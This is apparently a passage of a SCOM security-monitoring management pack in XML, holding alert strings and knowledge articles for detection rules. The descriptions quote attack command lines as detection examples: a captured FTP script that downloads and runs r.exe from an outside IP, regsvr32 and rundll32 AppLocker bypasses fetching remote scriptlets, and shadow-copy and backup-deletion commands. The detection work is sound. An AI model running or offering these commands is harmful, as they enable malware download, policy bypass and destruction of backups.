        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousReg.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  A suspicious process creation (registry) was executed</Name>
          <Description>            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousReg" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousReg" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerJava">
          <Name>Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass) was executed</Name>
          <Description>To bypass restrictive Applocker policies, attackers will implement a specially crafted commandline which makes use of Windows native exe "Rundll32.exe" (required by Windows to load and run code in DLLs and therefore not blocked by Applocker). Rundll32.exe can be used to call javascript to execute arbitrary commands which are not blocked by restrictive Applocker policies. The rundll32.exe syntax is as follows:

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";&lt;code&gt;


Events of this nature need to be investigated</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerJava.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass) was executed</Name>
          <Description>
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}
          </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerJava" SubElementID="Alert">
          <Name>Alert</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerJava" SubElementID="DS">
          <Name>DS</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousFTPCommand">
          <Name>Security Monitoring Forwarded Events:  A suspicious process creation (FTP script execution via echo command) was executed</Name>
          <Description>Detection of FTP Scripts created via the Echo command:
Based on several cases where compromised SQLService was used and SQL Agent Jobs were created to invoke ‘xp_cmdshell’ which in turn created and launched  FTP scripts to download and run malware…

Example of the commandline used to create and run ftp scripts:

"Command Line ": "\"\"\"C:\\Windows\\System32\\cmd.exe\"\" /c \"\"net1 stop sharedaccess&amp;echo open 222.186.58.12 &gt;&gt;  love.txt&amp;echo 123&gt;&gt; love.txt&amp;echo 123&gt;&gt; love.txt&amp;echo binary &gt;&gt; love.txt&amp;echo get r.exe &gt;&gt; love.txt&amp;echo bye &gt;&gt; love.txt&amp;ftp -s:love.txt&amp;p -s:love.txt&amp;r.exe&amp;r.exe&amp;del love.txt /q /f&amp;exit\"\"\"


This type of event is rare and should be investigated</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousFTPCommand.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  A suspicious process creation (FTP script execution via echo command) was executed</Name>
          <Description>            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerRegsvr">
          <Name>Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited</Name>
          <Description>AppLocker Bypass Techniques using Regsvr32.exe  (greg)
Note: The following is already contained in SCUBA_RULE_Applocker_Bypass

Examples:
regsvr32 /s /n /u /i:file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.jpg scrobj.dll</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerRegsvr.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited</Name>
          <Description>
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}
          </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousWindowsPosition">
          <Name>Security Monitoring Forwarded Events:  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed</Name>
          <Description>See: https://technet.microsoft.com/en-us/library/cc957410.aspx
The WindowPosition value specifies the position of the command window on the user's screen.
The value of this entry is an 8-byte hexadecimal value. The first four bytes (high word) represent the position of the window on the X (horizontal) axis. The last four bytes (low word) represent the position of the window on the Y (vertical) axis.
 
When the WindowPosition value is set to 201329664,  (Hex: 0x0c00 0c00) this places the console in a non-visible section of the user’s screen (where X axis=0c00 and the Y axis=0c00) in an area that is hidden from view below the visible start menu/taskbar 
 
Other console apps that can be modified to make the screen non-visible
          </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousWindowsPosition.AlertMessage">
          <Name>Security Monitoring Forwarded Events:  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed</Name>
          <Description>
            Logging Computer: {0}

            User Name: {1}

            Process Name: {2}

            Command Line: {3}
          </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Recovery.RestartWecSVC">
          <Name>Restart Service</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SystemPendingRestart">
          <Name>A System - Is Pending Restart</Name>
          <Description>A system has been identified as requiring a system restart. Not all features / functions will be available until after the restart has completed.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SystemPendingRestart" SubElementID="RebootRequired">
          <Name>Reboot is Needed</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SystemPendingRestart" SubElementID="NoRebootNeeded">
          <Name>No Reboot Needed</Name>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SystemPendingRestart_AlertMessageResourceID">
          <Name>A System - Is Pending Restart</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SoftwareInstallOnServer">
          <Name>Security Monitoring:  Software was Installed on a Server</Name>
          <Description>This rule look sfor 11707 events in the application log and alerts accordingly.  Note that patches will likely be flagged with this rule, so it should be turned on if there is a good maintenance process in place</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SoftwareInstallOnServer.AlertMessage">
          <Name>Security Monitoring:  Software was Installed on a Server</Name>
          <Description>Logging Computer:  {0}

User Name:  {1}

Event Description: {2}

</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.UnexpectedShutdown">
          <Name>Security Monitoring:  Unexpected System Shutdown</Name>
          <Description>This checks the system log for unexpected shutdown events and generates an alert.  While not necessarily related to an attack, these events are potentially worth investigating for health reasons in the environment.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.UnexpectedShutdown.AlertMessage">
          <Name>Security Monitoring:  Unexpected System Shutdown</Name>
          <Description>Logging Computer: {0}

User Name: {1}

Event Description: {2}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SystemRestarted">
          <Name>Security Monitoring:  A system was restarted</Name>
          <Description>This is not necessarily a security event, and as such this is disabled by default, but it can be useful in tracking security events or bad business practice.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SystemRestarted.AlertMessage">
          <Name>Security Monitoring:  A system was restarted</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SystemPoweredOff">
          <Name>Security Monitoring:  A system has been powered off</Name>
          <Description>This is not necessarily a security event, and as such it can generate noise and is off by default. </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SystemPoweredOff.AlertMessage">
          <Name>Security Monitoring:  A system has been powered off</Name>
          <Description>Event Description: {0}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SoftwareRemovedFromServer">
          <Name>Security Monitoring:  Software was Removed from a Server</Name>
          <Description>This may not be a security event and is disabled by default. This could be enabled and edited to target security software in customer environments.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AlertSummary">
          <Name>Alert Summary</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.FailedLoginSummary24Hours">
          <Name>Failed Login Summary (24 Hours)</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.FailedLoginSummary">
          <Name>Failed Login Summary</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.FailedLoginDetails">
          <Name>Failed Login Details</Name>
          <Description />
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoringMP.Event.SoftwareRemovedFromServer.AlertMessage">
          <Name>Security Monitoring:  Software was Removed from a Server</Name>
          <Description>Logging Computer: {0}

User Name:  {1}

Event Description: {2}</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoring.Event.FailedLogin.AlertMessage">
          <Name>Security Monitoring: Repeated logon attempts</Name>
          <Description>
            The following has occurred {0} times: 

            Event Description: {1}
          </Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoring.Failed.Login.Attempts.Collection">
          <Name>Security Monitoring: Collect Failed Login Attempts</Name>
          <Description>Failed Login Attempts</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoring.Event.FailedLogin">
          <Name>Security Monitoring: Failed RDP Logon</Name>
          <Description>Failed RDP Logon</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.EventCollectionSummary">
          <Name>Security Monitoring: Event Collection Summary</Name>
          <Description>Event Collection Summary</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.BatchLogonReport">
          <Name>Security Monitoring: Batch Logon Report</Name>
          <Description>Batch Logon Report</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SMBv1ConnectionReport">
          <Name>Security Monitoring: SMBv1 Connections Report</Name>
          <Description>SMBv1 Connections Report</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.LanManConnectionReport">
          <Name>Security Monitoring: LanMan Connection Report</Name>
          <Description>LanMan Connection Report</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.NTLMv1ConnectionReport">
          <Name>Security Monitoring: NTLM Version 1 Connection Report</Name>
          <Description>NTLM Version 1 Connection Report</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.WDigestConnectionReport">
          <Name>Security Monitoring: WDigest Connection Report</Name>
          <Description>WDigest Connection Report</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.LegacyTLSConnectionReport">
          <Name>Security Monitoring: Legacy TLS Protocols Connection Report</Name>
          <Description>Legacy TLS Protocols Connection Report</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AccountLockout">
          <Name>Security Monitoring: Account Lockout Report</Name>
          <Description>Account Lockout Report</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AuditAccountLogonDC">
          <Name>Security Monitoring: Account Logon Monitoring not Set on DCs</Name>
          <Description>Monitors Logon auditing setting</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AuditAccountLogonDC" SubElementID="ResultBad">
          <Name>ResultBad</Name>
          <Description>ResultBad</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AuditAccountLogonDC" SubElementID="ResultGood">
          <Name>ResultGood</Name>
          <Description>ResultGood</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AuditAccountLogonMS">
          <Name>Security Monitoring: Account Logon Monitoring not Set on Member Servers</Name>
          <Description>Monitors Logon auditing setting on Member Servers.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AuditAccountLogonMS" SubElementID="ResultBad">
          <Name>ResultBad</Name>
          <Description>ResultBad</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.AuditAccountLogonMS" SubElementID="ResultGood">
          <Name>ResultGood</Name>
          <Description>ResultGood</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.DirectoryServiceChangeAuditing">
          <Name>Security Monitoring: Directory Service Change Monitoring not Set on DCs</Name>
          <Description>Monitors directory service change auditing setting</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.DirectoryServiceChangeAuditing" SubElementID="ResultBad">
          <Name>ResultBad</Name>
          <Description>ResultBad</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.DirectoryServiceChangeAuditing" SubElementID="ResultGood">
          <Name>ResultGood</Name>
          <Description>ResultGood</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.IncludeCommandLineonDCs">
          <Name>Security Monitoring: Include Command Line in Audit Process Set on DC</Name>
          <Description>This will roll up the command line audit setting on Domain Controllers</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.IncludeCommandLineonMS">
          <Name>Security Monitoring: Include Command Line in Audit Process Set on Member Servers</Name>
          <Description>This will roll up the command line audit setting on Member Servers</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ProcessCreationMemberServer">
          <Name>Security Monitoring: Process Creation Setting for Member Servers</Name>
          <Description>Description for the new unit monitor.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ProcessCreationMemberServer" SubElementID="ResultBad">
          <Name>ResultBad</Name>
          <Description>ResultBad</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.ProcessCreationMemberServer" SubElementID="ResultGood">
          <Name>ResultGood</Name>
          <Description>ResultGood</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityAudit.ProcessCreationDC">
          <Name>Security Monitoring: Audit Process Creation Set on DC</Name>
          <Description>This Monitor is for Security Monitoring configuration settings only. It will not generate alerts, but the state view will show you where your gaps are in monitoring. This will monitor the Audit Process Creation setting on Domain Controllers.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityAudit.ProcessCreationDC" SubElementID="ResultBad">
          <Name>ResultBad</Name>
          <Description>ResultBad</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SecurityAudit.ProcessCreationDC" SubElementID="ResultGood">
          <Name>ResultGood</Name>
          <Description>ResultGood</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SGManagementDC">
          <Name>Security Monitoring: Security Group Management Audit not Set on DCs</Name>
          <Description>Monitors Account Management &gt; Security Group Management for Domain Controllers</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SGManagementDC" SubElementID="ResultBad">
          <Name>ResultBad</Name>
          <Description>ResultBad</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SGManagementDC" SubElementID="ResultGood">
          <Name>ResultGood</Name>
          <Description>ResultGood</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SpecialGroupLogonAuditingEnabledonDC">
          <Name>Security Monitoring:  Domain Controller Special Group Logon</Name>
          <Description>This monitor watches the audit policy settings for Special Group Logon. See https://blogs.technet.microsoft.com/jepayne/2015/11/26/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts/  for details.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SpecialGroupLogonAuditingEnabledonDC" SubElementID="ResultBad">
          <Name>ResultBad</Name>
          <Description>ResultBad</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SpecialGroupLogonAuditingEnabledonDC" SubElementID="ResultGood">
          <Name>ResultGood</Name>
          <Description>ResultGood</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SpecialGroupLogonEnabledOnMemberServers">
          <Name>Security Monitoring:  Member Server Special Group Logon</Name>
          <Description>This monitor watches the audit policy settings for Special Group Logon. See https://blogs.technet.microsoft.com/jepayne/2015/11/26/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts/  for details.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SpecialGroupLogonEnabledOnMemberServers" SubElementID="ResultBad">
          <Name>ResultBad</Name>
          <Description>ResultBad</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.SpecialGroupLogonEnabledOnMemberServers" SubElementID="ResultGood">
          <Name>ResultGood</Name>
          <Description>ResultGood</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.UserAccountMgmtMS">
          <Name>Security Monitoring: User Account Management Audit Setting not Set on Member Servers</Name>
          <Description>Monitors "Security Group Management" auditing setting</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.UserAccountMgmtMS" SubElementID="ResultBad">
          <Name>ResultBad</Name>
          <Description>ResultBad</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.UserAccountMgmtMS" SubElementID="ResultGood">
          <Name>ResultGood</Name>
          <Description>ResultGood</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoring.PowerShell.Task.CreateUserWriteableRegKey">
          <Name>Security Monitoring: Create Registry Key to Discover Writeable Locations</Name>
          <Description>Discovering a writeable location on the OS needs to be done with some caution. See blog article for details.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoring.PowerShell.Task.LAPSSetup">
          <Name>Security Monitoring: Create Registry Key to Setup LAPS Monitoring</Name>
          <Description>This will populate a registry key to allow SCOM to monitor LAPS compliance. It will also install the necessary PowerShell modules on this server. See blog article for details.</Description>
        </DisplayString>
        <DisplayString ElementID="SecurityMonitoring.PowerShell.Task.RemoveUserWriteableRegKey">
          <Name>Security Monitoring: Remove Registry Key to Discover Writeable Locations</Name>
          <Description>This task will remove the registry key needed to discovery writeable locations. It will trigger an undiscover. See blog article for details.</Description>
        </DisplayString>
        <DisplayString ElementID="Security.Monitoring.WindowsComputersExtendedWriteableDirectoryMonitoring">
          <Name>Security Monitoring: Extended Writeable Directory Monitoring Group</Name>
          <Description>This group contains the Windows Computer Objects that are using Extended OS Writeable Directory Monitoring</Description>
        </DisplayString>
      </DisplayStrings>
      <KnowledgeArticles>
        <KnowledgeArticle ElementID="Security.Monitoring.EventCollection.LanMan" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>Collection rule to collect all authentication events using LanManager to authenticate. This is an old protocol that has known vulnerabilities and should be shut off.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>There are no configurable options for this rule.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>NTLM Authentication will be logged to the Security event log.  Administrators should investigate NTLM logons and implement more secure protocols.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para />
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Additional Information</maml:title>
              <maml:para>Additional Reading: https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/ntlm-user-authentication</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.CollectionRule.CollectLAPSEvents" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>This rule collects events related to the Local Administrator Password Solution (LAPS).</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>There are no configurable overrides for this rule.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>LAPS is a solution from Microsoft for automatically managing the password for the local administrator on member servers and workstations.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para />
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Additional Information</maml:title>
              <maml:para>Download LAPS: https://www.microsoft.com/en-us/download/details.aspx?id=46899</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.SecurityMonitoring.Event.DCOUModify" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>Generates an Alert a modification is made to the Organizational Unit (OU) for Domain Controllers (DCs).</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>There are no overrides for this rule.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>This alert is generated when EventId 4662 is generated in the Security event log and the name of the impacted Organizational Unit contains the term *Domain Controllers*.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para>Investigate the reason for the change to the Organizational Unit.  If this activity is expected, consider adding a comment to the Alert before closing it.</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.Event.4688.GenericCryptoRansomWare" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>This rule looks for common process creation events seen when certain types of malware are installed on a server.  While it likely won't be useful for something that immediately acts, it could potentially detect versions configured to activate at a later time.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>There are no overrides for this rule.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>This alert is triggered by EventId 4688 in the Security Event Log.  In addition, Parameter 9 is checked for the following values:</maml:para>
              <maml:list>
                <maml:listItem>
                  <maml:para>wmic shadowcopy delete</maml:para>
                </maml:listItem>
                <maml:listItem>
                  <maml:para>bcdedit</maml:para>
                </maml:listItem>
                <maml:listItem>
                  <maml:para>vssadmin delete shadows /all /quiet</maml:para>
                </maml:listItem>
                <maml:listItem>
                  <maml:para>wbadmin delete catalog -quiet</maml:para>
                </maml:listItem>
              </maml:list>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para>Investigate the source of these alerts.  They may indicate an effort to insert ransomware into the environment and/or remove backup information.  If the activity is expected, consider adding a comment to the alert before closing it.</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.SecurityMonitoring.Event.GPOCreation" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>This rule detects the creation of a Group Policy Object (GPO).</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>There are no overrides for this rule.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>This alert is generated with EventId 5137 appears in the Security Event log.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para>Investigate why a GPO may have been created.  If this event is expected, consider adding a comment to the Alert and closing it.</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.SecurityMonitoring.Event.GPODeletionRule" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>This rule detects the deletion of a Group Policy Object (GPO).</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>There are no overrides for this rule.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>This alert is generated with EventId 5141 appears in the Security Event log.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para>Investigate why a GPO may have been deleted.  If this event is expected, consider adding a comment to the Alert and closing it.</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.Event.KillWindowsDefender" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on. </maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>There are no overrides for this rule.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>Generates an Alert when EventID 4688 appears in the Security Event Log and Parameter 9 contains Kill or Stop and MsMpEng.exe.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para>Investigate why the service was forcibly stopped.</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.Event.RemoteRegSvr32" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>A little known RegSvr32 attack vector is the ability to load malicious DLL files for a location that the attacker controls.  This can be over the internet or on an internal compromised host as RegSvr32 can take a URL with the correct sequence.  This method of attack can bypass antivirus.  A mitigation is in place using EMET, but if this tool is not in the environment, there is no way to detect it.  Several known attack attack tools use this method.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>There are no overrides for this rule.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>This alert is triggered when Event ID 4688 appears in the Security Event log and Parameter 9 indicates that the source is HTTP or HTTPS.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para>Investigate the source for the DLL.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Additional Information</maml:title>
              <maml:para>See https://attack.mitre.org/wiki/Technique/T1117#Examples for details.</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.SystemLogClearedv2" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>This rule monitors the system log for a log clearing event.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>By default, this rule is disabled.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>This alert is triggered when Event ID 1102 is raised in the Windows security Event Log.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para>Investigate the cause of the alert.  Consider increasing the size of the Security event log or increasing the amount of space available on the System drive.</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.Event.WMIPersistence" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>Generates an Alert when a WMI Subscription is created.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Configuration</maml:title>
              <maml:para>There are no overrides for this rule.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Causes</maml:title>
              <maml:para>Alerts when a WMI Subscription is created.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Resolutions</maml:title>
              <maml:para>Investigate the source of the WMI Subscription.</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Additional Information</maml:title>
              <maml:para>See this article for details.  https://nathangau.wordpress.com/2019/03/06/using-scom-to-detect-wmi-persistence-attempts/</maml:para>
            </maml:section>
          </MamlContent>
        </KnowledgeArticle>
        <KnowledgeArticle ElementID="Security.Monitoring.Event.WMIRemote.Source" Visible="true">
          <MamlContent>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
              <maml:title>Summary</maml:title>
              <maml:para>Possible WMI Remote Attempt made From this system</maml:para>
            </maml:section>
            <maml:section xmlns:maml="http://schemas.microsoft.com/maml/2004/10">
